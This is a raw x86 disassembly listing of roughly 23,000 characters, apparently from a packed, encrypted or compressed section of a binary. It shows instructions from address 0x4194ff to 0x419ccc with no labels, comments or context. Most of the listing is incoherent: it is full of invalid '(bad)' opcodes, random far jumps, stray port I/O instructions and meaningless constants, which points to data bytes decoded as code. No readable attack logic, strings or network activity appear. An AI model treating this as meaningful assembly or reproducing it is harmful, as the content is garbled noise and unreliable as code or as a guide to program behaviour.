  4194ff:	cld    
  419500:	jae    0x419492
  419502:	sbb    DWORD PTR [esi+0x18],0xd1d354f8
  419509:	(bad)  
  41950a:	and    bl,BYTE PTR [ebp+0x6a01a6c6]
  419510:	push   esp
  419511:	pusha  
  419512:	add    cl,BYTE PTR [edx]
  419514:	je     0x419532
  419516:	or     al,BYTE PTR [edi-0x6a1be0c]
  41951c:	outs   dx,DWORD PTR ds:[esi]
  41951d:	jmp    0x20b8:0x17e50d17
  419524:	mov    ds:0x3417aafd,al
  419529:	retf   
  41952a:	fist   DWORD PTR ss:[eax+0x0]
  41952e:	mov    ebp,DWORD PTR [ecx+eax*4+0x542868b9]
  419535:	dec    eax
  419536:	shl    BYTE PTR [edi+eiz*2+0x4f],0x64
  41953b:	sub    DWORD PTR [ecx+0x6],eax
  41953e:	das    
  41953f:	and    al,0xeb
  419541:	(bad)  
  419543:	adc    eax,0xc6a12de1
  419548:	and    dh,BYTE PTR [eax]
  41954a:	aam    0xd3
  41954c:	fcomp  DWORD PTR [eax]
  41954e:	gs mov ah,0xb5
  419551:	outs   dx,BYTE PTR ds:[esi]
  419552:	mov    cl,0x57
  419554:	(bad)  
  419555:	mov    ds:0xff25e2d6,eax
  41955a:	ret    
  41955b:	retf   0x9400
  41955e:	rcr    DWORD PTR [ebx+0x7641339e],1
  419564:	ins    DWORD PTR es:[edi],dx
  419565:	push   0xc48684db
  41956a:	pop    ebx
  41956b:	and    al,0x4f
  41956d:	es add esi,esp
  419570:	pop    esi
  419571:	arpl   WORD PTR [ebx+0x72cc3846],si
  419577:	push   ecx
  419578:	sub    eax,0x43c991e2
  41957d:	or     dh,dh
  41957f:	(bad)  
  419580:	xchg   ebx,eax
  419581:	daa    
  419582:	fstcw  WORD PTR [ebx+0x6c166e33]
  419589:	cmp    eax,DWORD PTR [esi-0x4c62d1f6]
  41958f:	aam    0x31
  419591:	lds    eax,FWORD PTR [ebx+0x2f]
  419594:	mov    DWORD PTR [ecx+0x55424d5f],eax
  41959a:	mov    al,0xa7
  41959c:	push   0x85f09015
  4195a1:	and    al,0x8b
  4195a3:	imul   esp,DWORD PTR [edi-0x12],0xd4610b57
  4195aa:	test   DWORD PTR [edx+0x35e53749],ecx
  4195b0:	xor    al,0x95
  4195b2:	(bad)  
  4195b3:	bound  ecx,QWORD PTR [edx+eiz*4+0x44]
  4195b7:	dec    eax
  4195b8:	adc    bh,ah
  4195ba:	push   eax
  4195bb:	in     eax,0x4b
  4195bd:	ss push eax
  4195bf:	fs retf 0x36fb
  4195c3:	add    ch,BYTE PTR [ebp+eax*1+0x2f965b97]
  4195ca:	(bad)  
  4195cb:	add    dl,BYTE PTR [eax]
  4195cd:	push   esi
  4195ce:	cld    
  4195cf:	and    BYTE PTR [edi+0x2d],0xe0
  4195d3:	dec    eax
  4195d4:	push   edi
  4195d5:	add    eax,0x6484d504
  4195da:	cmc    
  4195db:	cmp    esp,DWORD PTR [edi-0x14]
  4195de:	pop    ss
  4195df:	adc    BYTE PTR [ecx+ecx*8-0x38],ah
  4195e3:	jo     0x419618
  4195e5:	pushf  
  4195e6:	pop    ds
  4195e7:	aam    0xc5
  4195e9:	push   0x15
  4195eb:	push   esp
  4195ec:	jge    0x419596
  4195ee:	inc    ebp
  4195ef:	add    DWORD PTR [eax],edx
  4195f1:	adc    DWORD PTR [esi],esp
  4195f3:	sub    dl,BYTE PTR [edx+0x48]
  4195f6:	add    bh,BYTE PTR [edx]
  4195f8:	push   esi
  4195f9:	mov    dh,ah
  4195fb:	jmp    0x41aeb521
  419600:	mov    al,0x14
  419602:	push   cs
  419603:	xchg   edi,eax
  419604:	sti    
  419605:	xor    al,ch
  419607:	sti    
  419608:	push   ebx
  419609:	into   
  41960a:	leave  
  41960b:	push   ebx
  41960c:	fidivr DWORD PTR [ebx+ebp*4-0x69b1034d]
  419613:	fbld   TBYTE PTR [ecx+0x36]
  419616:	pop    esp
  419617:	mov    ebp,ds
  419619:	repnz or BYTE PTR [esi+0x1c2d4690],0xf6
  419621:	jl     0x41961e
  419623:	adc    al,0x78
  419625:	int3   
  419626:	clc    
  419627:	test   al,0x74
  419629:	dec    ebx
  41962a:	jns    0x4195cb
  41962c:	fwait
  41962d:	dec    esi
  41962e:	add    BYTE PTR [ebp+0x47615c08],ah
  419634:	lods   eax,DWORD PTR ds:[esi]
  419635:	pop    edx
  419636:	cmp    ebp,esi
  419638:	sub    eax,0x9ed35ad5
  41963d:	mov    ah,0x44
  41963f:	pop    edi
  419640:	aas    
  419641:	popa   
  419642:	inc    esi
  419643:	div    BYTE PTR [ecx]
  419645:	or     al,0xae
  419647:	mov    esp,edx
  419649:	jg     0x4195d1
  41964b:	in     al,0xc7
  41964d:	cmc    
  41964e:	xchg   esi,eax
  41964f:	ds dec esp
  419651:	faddp  st(3),st
  419653:	cmc    
  419654:	add    eax,0xa94c18e1
  419659:	mov    ds:0x33d0362a,eax
  41965e:	mov    dh,0xa7
  419660:	cmp    dl,BYTE PTR [eax]
  419662:	push   0x2d
  419664:	js     0x419673
  419666:	or     al,BYTE PTR [ecx-0x5c]
  419669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41966a:	sahf   
  41966b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41966c:	gs ret 0x87b3
  419670:	shr    ecx,0xd6
  419673:	bound  edx,QWORD PTR ds:0xde91c7e
  419679:	mov    bl,0x51
  41967b:	int    0xb6
  41967d:	fcomip st,st(0)
  41967f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419680:	xlat   BYTE PTR ds:[ebx]
  419681:	aad    0x5e
  419683:	dec    ecx
  419684:	pop    es
  419685:	fbstp  TBYTE PTR [edi-0x7a]
  419688:	mov    ds:0x941cd6a,al
  41968d:	fdiv   QWORD PTR [eax-0x19]
  419690:	jne    0x41966b
  419692:	ja     0x4196c6
  419694:	repz mov ecx,0x918d21f7
  41969a:	in     eax,0x50
  41969c:	dec    BYTE PTR [edi]
  41969e:	sahf   
  41969f:	paddd  mm5,QWORD PTR [ebx-0x770b1f48]
  4196a6:	push   esp
  4196a7:	bound  esi,QWORD PTR ds:0x3d19f63b
  4196ad:	push   ebp
  4196ae:	dec    ecx
  4196af:	das    
  4196b0:	hlt    
  4196b1:	and    al,0x44
  4196b3:	pop    ebp
  4196b4:	push   esi
  4196b5:	adc    al,0x10
  4196b7:	mov    ah,0xe1
  4196b9:	mov    ecx,0xce1c9b59
  4196be:	sti    
  4196bf:	sahf   
  4196c0:	dec    ebx
  4196c1:	push   ebp
  4196c2:	in     al,0xef
  4196c4:	xchg   BYTE PTR [edi],ch
  4196c6:	lahf   
  4196c7:	loope  0x4196ab
  4196c9:	daa    
  4196ca:	sbb    BYTE PTR [eax-0x16],0x4e
  4196ce:	and    BYTE PTR [ecx+0x7f99c942],al
  4196d4:	rcr    ecx,cl
  4196d6:	ret    
  4196d7:	mov    esi,0x3bb70322
  4196dc:	jge    0x4196ad
  4196de:	(bad)  
  4196df:	xchg   esi,eax
  4196e0:	xor    BYTE PTR [ebx-0x2eb19453],ah
  4196e6:	pop    ebx
  4196e7:	mov    ebp,0xaa408885
  4196ec:	push   ecx
  4196ed:	sbb    DWORD PTR [edx+0x67],esp
  4196f0:	int3   
  4196f1:	adc    edi,DWORD PTR [eax]
  4196f3:	pop    edi
  4196f4:	call   DWORD PTR [edi+0x1293767a]
  4196fa:	imul   esi,DWORD PTR [esi+0x6660885a],0x2c
  419701:	stos   DWORD PTR es:[edi],eax
  419702:	test   DWORD PTR [ecx+ebx*1+0x77],esi
  419706:	sub    eax,ebx
  419708:	(bad)  
  419709:	push   cs
  41970a:	sub    BYTE PTR ds:0xda611cc4,al
  419710:	sub    dl,bl
  419712:	jle    0x4196c9
  419714:	ins    DWORD PTR es:[edi],dx
  419715:	ret    
  419716:	dec    ebx
  419717:	xor    eax,0xb21e4b90
  41971c:	inc    eax
  41971d:	test   al,0xa6
  41971f:	(bad)  
  419720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419721:	pop    DWORD PTR [ebx]
  419723:	call   0x6d36075e
  419728:	mov    ebx,0x5d2904dd
  41972d:	add    al,dh
  41972f:	push   0x1e3b4c9e
  419734:	mov    ebp,DWORD PTR [edi+0x20]
  419737:	js     0x4196ec
  419739:	sbb    bh,BYTE PTR [edi+0x70d2ec59]
  41973f:	sub    esp,ebp
  419741:	(bad)  
  419742:	jnp    0x41973e
  419744:	outs   dx,DWORD PTR ds:[esi]
  419745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419746:	nop
  419747:	cmp    DWORD PTR [edi+0x1a],esp
  41974a:	xor    esp,esp
  41974c:	std    
  41974d:	mov    ds:0xfe5028b7,al
  419752:	xor    dh,BYTE PTR [eax]
  419754:	test   DWORD PTR [edx-0x1f],edx
  419757:	mov    eax,0xfe74d615
  41975c:	je     0x419777
  41975e:	ins    BYTE PTR es:[edi],dx
  41975f:	sti    
  419760:	xor    al,0x3b
  419762:	sbb    edi,DWORD PTR [edx+0x788675a9]
  419768:	gs retf 
  41976a:	dec    esp
  41976b:	lods   al,BYTE PTR ds:[esi]
  41976c:	mov    eax,ds:0x60aea870
  419771:	or     BYTE PTR [ebp+0x1082b52c],bl
  419777:	pinsrw mm3,WORD PTR [eax+ebx*2-0x40],0x3e
  41977d:	test   BYTE PTR fs:[ebp+0x36],dl
  419781:	push   ds
  419782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419783:	push   edx
  419784:	pop    es
  419785:	jmp    0x41973b
  419787:	pop    ds
  419788:	test   DWORD PTR [edi+edx*4-0x5f691521],esp
  41978f:	push   0xfffffff2
  419791:	pop    ss
  419792:	inc    ecx
  419793:	hlt    
  419794:	add    al,0xaa
  419796:	mov    al,ds:0x24949d72
  41979b:	push   ebp
  41979c:	mov    al,ds:0x51c62716
  4197a1:	out    0xc8,al
  4197a3:	repnz in al,0xcb
  4197a6:	(bad)  
  4197a7:	or     DWORD PTR [esi+0x370e5571],eax
  4197ad:	sbb    eax,0x4f9fe23d
  4197b2:	push   ecx
  4197b3:	or     al,0x95
  4197b5:	dec    ebp
  4197b6:	jo     0x41982a
  4197b8:	cmp    DWORD PTR [edi-0x70],esp
  4197bb:	loope  0x41977d
  4197bd:	cmp    al,0x40
  4197bf:	jl     0x4197e2
  4197c1:	and    DWORD PTR [esi+ebx*8+0x17],ebx
  4197c5:	pop    edx
  4197c6:	jno    0x4197d6
  4197c8:	and    ch,BYTE PTR [edx-0x7c]
  4197cb:	js     0x41980a
  4197cd:	mov    eax,0x9e01d25a
  4197d2:	lods   al,BYTE PTR ds:[esi]
  4197d3:	mov    ecx,0x1d07b651
  4197d8:	(bad)  
  4197d9:	div    DWORD PTR [eax+0x41]
  4197dc:	jmp    DWORD PTR [edx]
  4197de:	push   es
  4197df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e0:	(bad)  
  4197e2:	jns    0x41980f
  4197e4:	sbb    DWORD PTR fs:[eax+eiz*2-0xf],ecx
  4197e9:	je     0x419795
  4197eb:	dec    ecx
  4197ec:	(bad)  
  4197ed:	sub    DWORD PTR [edi-0x5a],esp
  4197f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f1:	add    dl,BYTE PTR [edi]
  4197f3:	cmp    esi,0x99464cab
  4197f9:	sti    
  4197fa:	push   0x96b89a41
  4197ff:	mov    al,ds:0xda8a8edb
  419804:	(bad)  
  419805:	loopne 0x41978f
  419807:	lock adc al,0xc9
  41980a:	sbb    bl,BYTE PTR [eax]
  41980c:	sub    DWORD PTR [esi-0x24],edi
  41980f:	outs   dx,DWORD PTR ds:[esi]
  419810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419811:	sbb    eax,0x38326558
  419816:	repnz add al,0x45
  419819:	inc    ebx
  41981a:	sbb    eax,DWORD PTR [edx-0xaabc81]
  419820:	sub    ebx,DWORD PTR [edx-0x73]
  419823:	out    0xb8,eax
  419825:	xchg   ebp,eax
  419826:	sbb    eax,0x1ba09422
  41982b:	fwait
  41982c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41982d:	dec    ebp
  41982e:	(bad)  
  41982f:	fcomi  st,st(6)
  419831:	and    esi,DWORD PTR [edi+0x30]
  419834:	int    0x8d
  419836:	shl    DWORD PTR [bx+si],0xc
  41983a:	inc    ebp
  41983b:	lods   eax,DWORD PTR ds:[esi]
  41983c:	call   0xaa5e5c99
  419841:	icebp  
  419842:	jo     0x4198c2
  419844:	(bad)  
  419845:	sbb    al,0xcf
  419847:	adc    al,0x27
  419849:	fcompp 
  41984b:	popa   
  41984c:	xchg   esp,eax
  41984d:	ret    
  41984e:	jmp    0x198ac8
  419853:	or     ch,bh
  419855:	adc    eax,0xde3675be
  41985a:	mov    BYTE PTR [ebp+eax*2+0x5c],0xa6
  41985f:	jnp    0x4197f8
  419861:	ret    0xcaec
  419864:	fdivr  DWORD PTR [edx-0x65]
  419867:	xor    BYTE PTR [edi+0x770652ab],0x9
  41986e:	mov    ch,0xd7
  419870:	sub    ah,BYTE PTR [eax+0x3c]
  419873:	enter  0x9f3e,0x72
  419877:	inc    edx
  419878:	in     al,0x38
  41987a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41987c:	imul   edi,ecx,0xfffffffe
  41987f:	rcr    DWORD PTR [ebx-0x3],0x61
  419883:	mov    bh,0xe8
  419885:	mov    al,ds:0xe83bd6cb
  41988a:	sub    DWORD PTR [edx+0x4d],edx
  41988d:	imul   ecx,DWORD PTR [eax+0x7c],0xffffffee
  419891:	in     eax,0x1
  419893:	ja     0x419818
  419895:	cmp    bl,BYTE PTR [esi+0x6134e662]
  41989b:	cmp    eax,0xcbec12e6
  4198a0:	inc    esp
  4198a1:	(bad)  [esi-0x64]
  4198a4:	popf   
  4198a5:	inc    eax
  4198a6:	(bad)  
  4198a7:	(bad)  
  4198a9:	loop   0x41991b
  4198ab:	mov    bh,0x5c
  4198ad:	jae    0x4198d5
  4198af:	mov    esp,0xf09b914a
  4198b4:	dec    edx
  4198b5:	loope  0x41987b
  4198b7:	xlat   BYTE PTR ds:[ebx]
  4198b8:	test   al,0xdd
  4198ba:	es push edi
  4198bc:	jbe    0x419895
  4198be:	lea    ebp,[ebx-0x3c]
  4198c1:	add    DWORD PTR [esi-0x6d604568],0x4b
  4198c8:	jl     0x4198a5
  4198ca:	stc    
  4198cb:	mov    ch,0xb4
  4198cd:	or     DWORD PTR [edi+edi*4+0x1f4e15c6],ebp
  4198d4:	jle    0x4198fa
  4198d6:	adc    DWORD PTR [ecx],edx
  4198d8:	or     ecx,DWORD PTR cs:[ebx-0x42158547]
  4198df:	push   ss
  4198e0:	mov    esi,0x742c70bf
  4198e5:	jle    0x41995d
  4198e7:	push   es
  4198e8:	add    BYTE PTR [edx*2-0x7b76e299],bl
  4198ef:	popa   
  4198f0:	out    dx,al
  4198f1:	loope  0x419906
  4198f3:	xchg   ebx,eax
  4198f4:	cmp    ah,BYTE PTR [ebp+0x10]
  4198f7:	(bad)  [ebx]
  4198f9:	loop   0x4198fe
  4198fb:	jno    0x419903
  4198fd:	into   
  4198fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ff:	xor    ah,cl
  419901:	jnp    0x41995e
  419903:	xchg   dl,dh
  419905:	sub    al,0x24
  419907:	xlat   BYTE PTR ds:[ebx]
  419908:	or     bl,BYTE PTR [edi-0x4]
  41990b:	pop    ss
  41990c:	arpl   WORD PTR [edi-0x27],ax
  41990f:	sbb    edx,DWORD PTR [ebp-0xfaaa44b]
  419915:	sbb    eax,0xdfbf160e
  41991a:	fnsave [eax+0x5cf10c6f]
  419920:	lahf   
  419921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419922:	cdq    
  419923:	mov    eax,ds:0x92622e1a
  419928:	push   0x53
  41992a:	adc    DWORD PTR [esi-0x183d149c],edx
  419930:	or     BYTE PTR [ecx],bh
  419932:	repz xchg ebx,eax
  419934:	jp     0x41995d
  419936:	in     eax,0xb9
  419938:	jb     0x41999d
  41993a:	and    DWORD PTR [ecx+eiz*8+0x62],eax
  41993e:	mov    eax,0x33f0e4e6
  419943:	jno    0x419934
  419945:	sub    bh,BYTE PTR [ebx]
  419947:	imul   ebx,DWORD PTR [esi+0x1],0xffffffef
  41994b:	or     al,0xac
  41994d:	adc    ebx,0xffffff98
  419950:	jmp    0x2365:0x1ce5373d
  419957:	add    cl,0xdc
  41995a:	aas    
  41995b:	repnz xchg esp,eax
  41995d:	fnstsw WORD PTR [ebp+0x54e34efa]
  419963:	adc    eax,0xfb0581c
  419968:	sbb    BYTE PTR [edi],dl
  41996a:	sbb    DWORD PTR [eax],eax
  41996c:	inc    esp
  41996d:	lahf   
  41996e:	add    edx,DWORD PTR ds:0x5332de7c
  419974:	sub    eax,0x8fee01a1
  419979:	mov    dh,0x2e
  41997b:	mov    DWORD PTR [edx+0x5dea613f],esp
  419981:	xor    eax,0xd005e3e
  419986:	(bad)  
  419987:	iret   
  419988:	jmp    0x4199a2
  41998a:	loopne 0x41991f
  41998c:	data16 jns 0x4199b2
  41998f:	push   ebx
  419990:	mov    ah,0xb3
  419992:	mov    ebp,0x4c821c1e
  419997:	test   al,0xf0
  419999:	sbb    bl,0x65
  41999c:	in     eax,0x77
  41999e:	adc    edi,edx
  4199a0:	mov    edx,0x67de191e
  4199a5:	std    
  4199a6:	retf   0x3e08
  4199a9:	mov    bl,BYTE PTR [edx+0x5c]
  4199ac:	jne    0x419939
  4199ae:	aas    
  4199af:	mov    esp,0xd49d6c97
  4199b4:	sbb    dh,ch
  4199b6:	mov    DWORD PTR [eax+ebp*8+0x7],edi
  4199ba:	sub    DWORD PTR [edx+0x624edb55],ebx
  4199c0:	rcr    BYTE PTR [ecx+eiz*8-0x6d722240],cl
  4199c7:	test   DWORD PTR [ebx],ecx
  4199c9:	sub    edi,DWORD PTR [ecx]
  4199cb:	into   
  4199cc:	pop    ss
  4199cd:	xchg   edx,eax
  4199ce:	xchg   edx,eax
  4199cf:	pop    ds
  4199d0:	popf   
  4199d1:	stos   DWORD PTR es:[edi],eax
  4199d2:	jle    0x4199e7
  4199d4:	push   es
  4199d5:	mov    bh,0xbd
  4199d7:	adc    BYTE PTR ds:0xb917e94a,ch
  4199dd:	fimul  DWORD PTR [edi+ecx*8]
  4199e0:	pop    eax
  4199e1:	inc    eax
  4199e2:	lods   al,BYTE PTR ds:[esi]
  4199e3:	inc    edx
  4199e4:	sbb    BYTE PTR [esi+ecx*2+0x3a],ch
  4199e8:	daa    
  4199e9:	lods   eax,DWORD PTR ds:[esi]
  4199ea:	xchg   edx,eax
  4199eb:	repnz arpl WORD PTR [edi+ebp*1],di
  4199ef:	pop    ebx
  4199f0:	jl     0x419a49
  4199f2:	mov    dl,0x79
  4199f4:	aam    0xab
  4199f6:	xor    cl,BYTE PTR [ecx-0x27e15609]
  4199fc:	popf   
  4199fd:	sub    DWORD PTR [ebx+0x495fcff],ebp
  419a03:	sti    
  419a04:	jmp    0xe2362f61
  419a09:	pusha  
  419a0a:	jmp    0x41999c
  419a0c:	popf   
  419a0d:	call   0xbf15:0x1c935412
  419a14:	pop    ecx
  419a15:	and    eax,esp
  419a17:	jmp    0x2bfc:0xed38
  419a1d:	out    0xfd,al
  419a1f:	xor    eax,0xd71e8d77
  419a24:	repz and BYTE PTR [esi],ah
  419a27:	jle    0x4199cd
  419a29:	ja     0x29af9a73
  419a2f:	xchg   ebp,eax
  419a30:	nop
  419a31:	clc    
  419a32:	(bad)  
  419a33:	jmp    0x39f9:0x49ce2333
  419a3a:	aam    0x24
  419a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3d:	out    dx,al
  419a3e:	xor    al,0x2a
  419a40:	or     DWORD PTR [esi+0x54],0x8edd5134
  419a47:	cdq    
  419a48:	and    DWORD PTR [ecx],eax
  419a4a:	or     edx,DWORD PTR [eax+0x6a]
  419a4d:	out    0xbf,al
  419a4f:	in     eax,0xd8
  419a51:	out    0xa7,al
  419a53:	and    eax,0xb24f64d3
  419a58:	jg     0x419a90
  419a5a:	mul    esp
  419a5c:	mov    WORD PTR [ebp+0x7740c710],gs
  419a62:	mov    esi,0xdcae234a
  419a67:	xchg   ecx,eax
  419a68:	jo     0x419a52
  419a6a:	or     BYTE PTR [ebx+0x6b],0x7
  419a6e:	mov    WORD PTR [eax],es
  419a70:	stc    
  419a71:	ret    
  419a72:	sub    ah,BYTE PTR [edi-0x5f]
  419a75:	push   edx
  419a76:	pop    edi
  419a77:	push   esp
  419a78:	sub    eax,0x8bf87bc7
  419a7d:	fmulp  st(2),st
  419a7f:	mov    ah,0xa6
  419a81:	mov    ah,0x4a
  419a83:	(bad)  
  419a85:	div    BYTE PTR [edx]
  419a87:	rcr    DWORD PTR [ecx-0xa42f998],cl
  419a8d:	test   DWORD PTR [eax-0x397899d],ebp
  419a93:	inc    esi
  419a94:	and    al,0xde
  419a96:	inc    BYTE PTR [eax+eiz*4-0x3b9bf3e4]
  419a9d:	and    eax,0xe4dcbfc6
  419aa2:	mov    ?,WORD PTR [ebp-0x21]
  419aa5:	ficomp DWORD PTR [esi+0x1b]
  419aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aa9:	xor    al,0xd3
  419aab:	icebp  
  419aac:	xor    dh,BYTE PTR [ebx+0x28]
  419aaf:	push   ecx
  419ab0:	jle    0x419b28
  419ab2:	jne    0x419a68
  419ab4:	jge    0x419a58
  419ab6:	fild   QWORD PTR [eax-0x3a65231b]
  419abc:	jns    0x419acd
  419abe:	(bad)  [edx]
  419ac0:	inc    ebp
  419ac1:	or     DWORD PTR [ecx-0x40949b2f],0x5a
  419ac8:	shr    BYTE PTR [edx+0x6b],0xfe
  419acc:	das    
  419acd:	add    DWORD PTR [edx],ebx
  419acf:	add    BYTE PTR [esi+0x3],dh
  419ad2:	nop
  419ad3:	(bad)  
  419ad4:	cld    
  419ad5:	add    DWORD PTR [ecx-0x60fc7128],0xfffffff4
  419adc:	pop    ss
  419add:	push   es
  419ade:	mov    edi,esi
  419ae0:	into   
  419ae1:	xchg   edx,eax
  419ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ae3:	or     esp,DWORD PTR [edi]
  419ae5:	loope  0x419aa5
  419ae7:	les    edi,FWORD PTR [eax]
  419ae9:	push   esp
  419aea:	add    BYTE PTR [edx+0x732b30d8],dh
  419af0:	mov    ch,dh
  419af2:	(bad)  
  419af3:	xchg   edi,eax
  419af4:	mov    cl,0x78
  419af6:	mov    al,0xc6
  419af8:	jg     0x419b1d
  419afa:	mov    ch,0xf
  419afc:	adc    eax,0xc1b8f07e
  419b01:	lahf   
  419b02:	xchg   esi,eax
  419b03:	push   0x18
  419b05:	popf   
  419b06:	cmp    al,0xf1
  419b08:	jb     0x419b20
  419b0a:	xchg   edx,eax
  419b0b:	sub    al,0xab
  419b0d:	lods   al,BYTE PTR ds:[esi]
  419b0e:	div    BYTE PTR [esi]
  419b10:	lods   al,BYTE PTR ds:[esi]
  419b11:	ficomp DWORD PTR [eax+0x57d95961]
  419b17:	push   eax
  419b18:	dec    esp
  419b19:	pushf  
  419b1a:	in     al,dx
  419b1b:	dec    ebx
  419b1c:	pushf  
  419b1d:	popf   
  419b1e:	ds aaa 
  419b20:	push   esi
  419b21:	jge    0x419afb
  419b23:	add    BYTE PTR [eax+0x66386e44],ch
  419b29:	popa   
  419b2a:	inc    ebp
  419b2b:	inc    ebx
  419b2c:	and    al,0xd3
  419b2e:	mov    edx,0x4bd53c10
  419b33:	in     al,dx
  419b34:	lea    esp,[edi]
  419b36:	jns    0x419afc
  419b38:	push   ebx
  419b39:	call   0x1cdbc9a4
  419b3e:	loop   0x419b11
  419b40:	mov    ah,0xb1
  419b42:	mov    al,ds:0xf0c47889
  419b47:	jg     0x419b76
  419b49:	sbb    eax,0x93a0e33a
  419b4e:	lods   eax,DWORD PTR ds:[esi]
  419b4f:	outs   dx,BYTE PTR ds:[esi]
  419b50:	or     BYTE PTR [ebp-0x9698ba7],dl
  419b56:	xchg   ebp,eax
  419b57:	xor    eax,0xee222d66
  419b5c:	mov    esp,0xcf54490c
  419b61:	lock inc esp
  419b63:	ficom  DWORD PTR [eax]
  419b65:	iret   
  419b66:	enter  0x79fa,0x8f
  419b6a:	dec    ebp
  419b6b:	in     al,0xc8
  419b6d:	aaa    
  419b6e:	jns    0x419b39
  419b70:	sbb    esp,DWORD PTR [edx-0xdc6d3a1]
  419b76:	sbb    DWORD PTR [esi+0x38901aa8],ecx
  419b7c:	inc    edi
  419b7d:	mov    DWORD PTR ds:0xcd1c97c0,esi
  419b83:	jns    0x419bf0
  419b85:	cmp    esp,DWORD PTR [edx+ebx*1+0x37]
  419b89:	jecxz  0x419baf
  419b8b:	addr16 adc ebp,eax
  419b8e:	or     al,0x6b
  419b90:	add    al,0xbe
  419b92:	adc    ecx,DWORD PTR [ecx]
  419b94:	inc    ebx
  419b95:	pushf  
  419b96:	or     eax,0xadb2765f
  419b9b:	xchg   DWORD PTR [ebp-0xf],esi
  419b9e:	sbb    BYTE PTR [ecx],dh
  419ba0:	jg     0x419c18
  419ba2:	push   0x113e8731
  419ba7:	and    al,0x73
  419ba9:	adc    al,0xd8
  419bab:	fnstcw WORD PTR [eax-0x43690f66]
  419bb1:	add    al,0x16
  419bb3:	mov    ah,0x20
  419bb5:	pop    ebp
  419bb6:	nop
  419bb7:	sub    ebx,DWORD PTR [ecx-0x4a]
  419bba:	push   eax
  419bbb:	xchg   ebp,eax
  419bbc:	pop    edx
  419bbd:	(bad)  
  419bbe:	push   esi
  419bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc0:	ret    0x2037
  419bc3:	lock rcl DWORD PTR [esp+esi*2+0x3c415e80],0x3c
  419bcc:	int3   
  419bcd:	int3   
  419bce:	bndstx [esi-0x7487229e],bnd2
  419bd5:	or     eax,0x85096b74
  419bda:	ror    DWORD PTR [ebx-0x7c8e0386],cl
  419be0:	mul    DWORD PTR cs:[esi+0x344cde61]
  419be7:	mov    eax,0x9bf26fcb
  419bec:	cmp    DWORD PTR [edi-0x26b6992d],ebp
  419bf2:	out    dx,al
  419bf3:	ja     0x419bef
  419bf5:	pop    edi
  419bf6:	xlat   BYTE PTR ds:[ebx]
  419bf7:	sub    eax,0xf0256c0f
  419bfc:	psubd  mm4,QWORD PTR [edx+0x49]
  419c00:	fwait
  419c01:	repnz xchg esi,eax
  419c03:	mov    ebp,0x66d661e7
  419c08:	mov    dh,0x6e
  419c0a:	pop    eax
  419c0b:	aad    0x10
  419c0d:	mov    ds:0xa7e435ec,eax
  419c12:	bound  eax,QWORD PTR [eax-0x53]
  419c15:	loopne 0x419bec
  419c17:	dec    esp
  419c18:	lods   eax,DWORD PTR ds:[esi]
  419c19:	xchg   ebx,eax
  419c1a:	pop    ds
  419c1b:	inc    ecx
  419c1c:	mov    al,ds:0x80421da3
  419c21:	fcmovnbe st,st(3)
  419c23:	cdq    
  419c24:	std    
  419c25:	xchg   ebp,eax
  419c26:	fwait
  419c27:	outs   dx,BYTE PTR ds:[esi]
  419c28:	jb     0x419c2b
  419c2a:	cmp    ah,bh
  419c2c:	ins    DWORD PTR es:[edi],dx
  419c2d:	adc    bh,0xc5
  419c30:	cmp    ebx,DWORD PTR [edx]
  419c32:	call   0x5c359389
  419c37:	and    al,BYTE PTR [ebx+0x62]
  419c3a:	jl     0x419c74
  419c3c:	scas   al,BYTE PTR es:[edi]
  419c3d:	and    edx,DWORD PTR [ecx+ecx*2-0x49bef36e]
  419c44:	ds mov ebx,0x51524e62
  419c4a:	fcom   DWORD PTR [edx+0x71]
  419c4d:	scas   eax,DWORD PTR es:[edi]
  419c4e:	sub    dl,BYTE PTR [ecx+0x70c5218a]
  419c54:	int    0xc9
  419c56:	and    esi,DWORD PTR [ebx-0x245d0d64]
  419c5c:	mov    al,BYTE PTR [eax-0x20095315]
  419c62:	repz in al,0xa2
  419c65:	mov    esp,0xc60842b
  419c6a:	sub    DWORD PTR [eax],edx
  419c6c:	and    esp,DWORD PTR [ebp+0x17]
  419c6f:	or     edi,DWORD PTR [edx+0x2e149e8d]
  419c75:	pusha  
  419c76:	mov    bl,0xf9
  419c78:	cmp    edi,DWORD PTR [edx]
  419c7a:	mov    edx,0x3bb79dd7
  419c7f:	xchg   esp,eax
  419c80:	add    esp,ecx
  419c82:	test   eax,0x687eadd4
  419c87:	sub    eax,0xbac19e9a
  419c8c:	mov    ecx,0x62e2cc9
  419c91:	repz out 0xbd,eax
  419c94:	stc    
  419c95:	ja     0x419cbe
  419c97:	dec    eax
  419c98:	or     al,0xdd
  419c9a:	jne    0x419cea
  419c9c:	scas   eax,DWORD PTR es:[edi]
  419c9d:	cmp    ah,BYTE PTR [edi+eax*4+0x21]
  419ca1:	lods   al,BYTE PTR ds:[esi]
  419ca2:	iret   
  419ca3:	pop    edi
  419ca4:	inc    ebp
  419ca5:	jbe    0x419d0f
  419ca7:	add    edx,DWORD PTR [eax]
  419ca9:	pop    ss
  419caa:	ins    BYTE PTR es:[edi],dx
  419cab:	sub    BYTE PTR [edx],ah
  419cad:	jb     0x419ce7
  419caf:	aaa    
  419cb0:	test   BYTE PTR [edx],ah
  419cb2:	mov    al,ds:0xf3547245
  419cb7:	push   eax
  419cb8:	mov    ds:0x6abd14d1,al
  419cbd:	cmp    eax,0xfc063d1e
  419cc2:	jle    0x419d02
  419cc4:	or     DWORD PTR [edx],ecx
  419cc6:	lock mov cl,0x70
  419cc9:	nop
  419cca:	pop    ds
  419ccb:	push   ss
  419ccc:	call   ebp
